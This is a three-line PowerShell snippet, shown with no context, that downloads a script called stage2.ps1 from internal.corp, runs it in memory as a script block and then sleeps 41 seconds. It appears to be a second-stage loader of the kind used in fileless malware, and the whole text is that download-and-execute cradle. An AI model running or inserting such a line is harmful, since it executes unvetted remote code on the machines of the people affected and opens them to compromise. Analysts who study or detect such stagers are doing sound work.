$ScriptText = (iwr "https://internal.corp/stage2.ps1" -UseBasicParsing).Content
[ScriptBlock]::Create($ScriptText).Invoke()
Start-Sleep -Seconds 41
